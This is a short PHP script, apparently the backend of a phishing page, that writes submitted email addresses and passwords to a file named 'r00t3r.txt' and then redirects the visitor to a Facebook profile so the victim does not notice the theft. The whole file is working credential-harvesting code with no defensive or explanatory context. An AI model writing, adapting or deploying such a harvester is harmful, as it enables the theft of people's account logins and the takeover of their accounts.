<?php /* Created on: 03/03./2010 */ 
$fp = fopen("r00t3r.txt", "a");
fwrite($fp, "Email:$_POST[email]\tPassword:$_POST[password]\n");
return header('Location: https://www.facebook.com/ekhdemni');
